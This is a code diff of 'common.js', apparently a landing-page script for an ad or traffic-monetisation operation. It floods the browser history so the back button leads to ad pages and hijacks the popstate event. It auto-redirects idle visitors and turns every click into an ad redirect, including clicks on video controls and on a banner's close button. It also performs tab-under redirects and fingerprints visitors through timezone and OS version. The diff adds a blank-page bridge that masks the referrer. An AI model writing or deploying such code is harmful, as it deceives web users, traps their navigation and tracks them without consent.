@@ -1,4 +1,4 @@
-/* common.js — FINAL v10 (Direct Open + Banner + Modal + AgeExit) */
+/* common.js — FINAL v10 (Blank Bridge Edition) */
 
 (() => {
   "use strict";
@@ -10,18 +10,18 @@
   const err  = (...a) => safe(() => console.error(...a));
 
   const replaceTo = (url) => {
-    try { window.location.replace(url); } catch { window.location.href = url; }
+    try { window.location.replace(url); }
+    catch { window.location.href = url; }
   };
 
-  // --- FIXED: Прямое открытие (Без черного экрана и about:blank) ---
-  const openTab = (url) => {
+  // --- NEW: Blank bridge instead of direct open ---
+  const openTab = (targetUrl) => {
     try {
-      // Сразу передаем URL. Адресная строка заполнится мгновенно.
-      const w = window.open(url, "_blank");
-      
-      // Сбрасываем opener для безопасности
+      const bridge = new URL("/blank.html", window.location.href);
+      bridge.searchParams.set("go", targetUrl);
+
+      const w = window.open(bridge.toString(), "_blank");
       if (w) { try { w.opener = null; } catch {} }
-      
       return w || null;
     } catch {
       return null;
@@ -53,8 +53,10 @@
     return qs;
   };
 
-  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
-  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
+  const getTimezoneName = () =>
+    safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
+  const getTimezoneOffset = () =>
+    safe(() => new Date().getTimezoneOffset()) ?? 0;
 
   const getOsVersion = async () => {
     try {
@@ -70,12 +72,11 @@
   const buildCmeta = () => {
     try {
       const html = document.documentElement;
-      const payload = {
+      return btoa(JSON.stringify({
         dataVer: html.getAttribute("data-version") || html.dataset.version || "",
         landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
         templateHash: window.templateHash || "",
-      };
-      return btoa(JSON.stringify(payload));
+      }));
     } catch { return ""; }
   };
 
@@ -89,7 +90,7 @@
 
     Object.entries(appCfg).forEach(([k, v]) => {
       if (v == null || v === "" || k === "domain") return;
-      
+
       let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
@@ -98,8 +99,10 @@
         ex[tab][field] = v;
         return;
       }
+
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) { ensure(m[1])[m[2]] = v; return; }
+
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -116,13 +119,24 @@
   // URL Builders
   // ---------------------------
   const buildExitQSFast = ({ zoneId }) => {
-    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
+    const ab2r = IN.abtest || String(window.APP_CONFIG?.abtest ?? "");
     const base = {
-      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
-      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
-      os_version: osVersionCached || "", btz: getTimezoneName(), bto: String(getTimezoneOffset()),
-      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
-      ae: IN.ae || "", ab2r,
+      ymid: IN.var_1 || IN.var || "",
+      var: IN.var_2 || IN.z || "",
+      var_3: IN.var_3 || "",
+      b: IN.b || "",
+      campaignid: IN.campaignid || "",
+      click_id: IN.s || "",
+      rhd: IN.rhd || "1",
+      os_version: osVersionCached || "",
+      btz: getTimezoneName(),
+      bto: String(getTimezoneOffset()),
+      cmeta: buildCmeta(),
+      pz: IN.pz || "",
+      tb: IN.tb || "",
+      tb_reverse: IN.tb_reverse || "",
+      ae: IN.ae || "",
+      ab2r,
     };
     if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
     return qsFromObj(base);
@@ -144,8 +158,8 @@
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) { window.history.pushState(null, "Please wait...", url); }
-      window.history.pushState(null, document.title, originalUrl);
+      for (let i = 0; i < n; i++) history.pushState(null, "Please wait...", url);
+      history.pushState(null, document.title, originalUrl);
     } catch (e) { err("Back pushState error:", e); }
   };
 
@@ -153,8 +167,7 @@
     const { origin, pathname } = window.location;
     let dir = pathname.replace(/\/(index|back)\.html$/i, "");
     if (dir.endsWith("/")) dir = dir.slice(0, -1);
-    if (!dir) return `${origin}/back.html`;
-    return `${origin}${dir}/back.html`;
+    return dir ? `${origin}${dir}/back.html` : `${origin}/back.html`;
   };
 
   const initBackFast = (cfg) => {
@@ -164,8 +177,12 @@
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
     const qs = buildExitQSFast({ zoneId: b.zoneId });
+
     if (b.url) qs.set("url", String(b.url));
-    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
+    else {
+      qs.set("z", String(b.zoneId));
+      qs.set("domain", String(b.domain || cfg.domain || ""));
+    }
     page.search = qs.toString();
     pushBackStates(page.toString(), count);
   };
@@ -173,7 +190,8 @@
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
     if (ex.url) return String(ex.url);
-    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
+    if (ex.zoneId && (ex.domain || cfg?.domain))
+      return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
     return "";
   };
 
@@ -182,32 +200,33 @@
     if (!ex) return;
     const url = resolveUrlFast(ex, cfg);
     if (!url) return;
+
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
     if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
-    else { replaceTo(url); }
+    else replaceTo(url);
   };
 
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
-    const ct = ex.currentTab;
-    const nt = ex.newTab;
-    const ctUrl = resolveUrlFast(ct, cfg);
-    const ntUrl = resolveUrlFast(nt, cfg);
+    const ctUrl = resolveUrlFast(ex.currentTab, cfg);
+    const ntUrl = resolveUrlFast(ex.newTab, cfg);
 
     safe(() => {
-      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
-      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
+      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ex.currentTab?.zoneId || ex.currentTab?.url });
+      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: ex.newTab?.zoneId || ex.newTab?.url });
     });
 
     if (withBack) initBackFast(cfg);
     if (ntUrl) openTab(ntUrl);
-    if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
+    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
   };
 
   const run = (cfg, name) => {
     if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
+      return cfg?.mainExit?.newTab
+        ? runExitDualTabsFast(cfg, "mainExit", true)
+        : runExitCurrentTabFast(cfg, "mainExit", true);
     }
     if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
     return runExitCurrentTabFast(cfg, name, true);
@@ -218,19 +237,27 @@
   // ---------------------------
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
-    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", () => { runExitCurrentTabFast(cfg, "reverse", false); });
+    history.pushState({ __rev: 1 }, "", window.location.href);
+    window.addEventListener("popstate", () => runExitCurrentTabFast(cfg, "reverse", false));
   };
 
   const initAutoexit = (cfg) => {
     if (!cfg?.autoexit?.currentTab) return;
     const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
     let armed = false;
-    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
+    const trigger = () => {
+      if (document.visibilityState === "visible" && armed)
+        runExitCurrentTabFast(cfg, "autoexit", true);
+    };
     const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
-    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
+    const cancel = () => {
+      clearTimeout(timer);
+      document.removeEventListener("visibilitychange", trigger);
+    };
     document.addEventListener("visibilitychange", trigger);
-    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
+    ["mousemove", "click", "scroll"].forEach(ev =>
+      document.addEventListener(ev, cancel, { once: true })
+    );
   };
 
   const isPlayerReady = () => {
@@ -242,33 +269,37 @@
   // Micro Handoff
   // ---------------------------
   const MICRO_DONE_KEY = "__micro_done";
+
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
     u.searchParams.set("__skipPreview", "1");
-    
-    // Синхронизация времени и постера
+
     const video = document.querySelector("video");
     if (video) {
-        u.searchParams.set("t", video.currentTime || 0);
-        if (video.getAttribute("poster")) u.searchParams.set("__poster", video.getAttribute("poster"));
+      u.searchParams.set("t", video.currentTime || 0);
+      if (video.getAttribute("poster"))
+        u.searchParams.set("__poster", video.getAttribute("poster"));
     }
     return u.toString();
   };
 
   const runMicroHandoff = (cfg) => {
     if (isClone) return;
-    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
-    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
+    if (sessionStorage.getItem(MICRO_DONE_KEY) === "1")
+      return run(cfg, "mainExit");
+
+    sessionStorage.setItem(MICRO_DONE_KEY, "1");
 
     const cloneUrl = buildCloneUrl();
-    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
+    window.syncMetric?.({ event: "micro_open_clone" });
     openTab(cloneUrl);
 
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
+
     if (monetUrl) {
-      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
+      window.syncMetric?.({ event: "tabUnderClick" });
       initBackFast(cfg);
       setTimeout(() => replaceTo(monetUrl), 40);
     } else {
@@ -277,11 +308,14 @@
   };
 
   // ---------------------------
-  // Click Map (ADDED BANNER LOGIC HERE)
+  // Click Map (unchanged)
   // ---------------------------
   const initClickMap = (cfg) => {
-    const fired = { mainExit: false, back: false };
-    const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);
+    const fired = { mainExit: false };
+    const microTargets = new Set([
+      "timeline","play_pause","mute_unmute","settings",
+      "fullscreen","pip_top","pip_bottom"
+    ]);
 
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
@@ -289,85 +323,53 @@
       const modal = document.getElementById("xh_exit_modal");
       const banner = document.getElementById("xh_banner");
 
-      // 1. БАННЕР: КАРТИНКА -> ВЫХОД
-      if (t === "banner_main") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "mainExit"); 
-        return;
-      }
+      if (t === "banner_main") { e.preventDefault(); run(cfg, "mainExit"); return; }
+      if (t === "banner_close") { e.preventDefault(); banner && (banner.style.display = "none"); runMicroHandoff(cfg); return; }
+      if (t === "back_button") { e.preventDefault(); modal && (modal.style.display = "flex"); return; }
+      if (t === "modal_stay") { e.preventDefault(); modal && (modal.style.display = "none"); runMicroHandoff(cfg); return; }
+      if (t === "modal_leave") { e.preventDefault(); run(cfg, "ageExit"); return; }
 
-      // 2. БАННЕР: КРЕСТИК/КНОПКА -> MICRO HANDOFF (Клон + Табандер)
-      if (t === "banner_close") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (banner) banner.style.display = "none";
-        runMicroHandoff(cfg); 
-        return;
-      }
-
-      // 3. BACK UI BUTTON -> SHOW MODAL
-      if (t === "back_button") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (modal) {
-            modal.style.display = "flex";
-            fired.back = true; 
-        }
-        return;
-      }
-
-      // 4. MODAL: "STAY" -> Micro Handoff
-      if (t === "modal_stay") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        if (modal) modal.style.display = "none";
-        runMicroHandoff(cfg);
-        return;
-      }
-
-      // 5. MODAL: "LEAVE" -> AgeExit (Dual)
-      if (t === "modal_leave") {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "ageExit");
-        return;
-      }
-
-      // 6. CLONE -> Main Exit
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        e.preventDefault();
         run(cfg, "mainExit");
         return;
       }
 
-      // 7. MICRO CONTROLS
       if (microTargets.has(t)) {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        e.preventDefault();
         runMicroHandoff(cfg);
         return;
       }
 
-      // 8. MAIN EXIT (ALL OTHERS)
       if (fired.mainExit) return;
       fired.mainExit = true;
-      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); 
+      e.preventDefault();
       run(cfg, "mainExit");
-    }, true); 
+    }, true);
   };
 
   const boot = () => {
-    if (typeof window.APP_CONFIG === "undefined") {
-      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
-      return;
-    }
+    if (!window.APP_CONFIG) return;
     const cfg = normalizeConfig(window.APP_CONFIG);
     if (!cfg) return;
 
     window.LANDING_EXITS = {
-      cfg, run: (name) => run(cfg, name), initBack: () => initBackFast(cfg),
-      microHandoff: () => runMicroHandoff(cfg), isPlayerReady,
+      cfg,
+      run: (name) => run(cfg, name),
+      initBack: () => initBackFast(cfg),
+      microHandoff: () => runMicroHandoff(cfg),
+      isPlayerReady,
     };
-    initClickMap(cfg); initAutoexit(cfg); initReverse(cfg);
+
+    initClickMap(cfg);
+    initAutoexit(cfg);
+    initReverse(cfg);
   };
 
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
+  if (document.readyState === "loading")
+    document.addEventListener("DOMContentLoaded", boot);
   else boot();
+
 })();
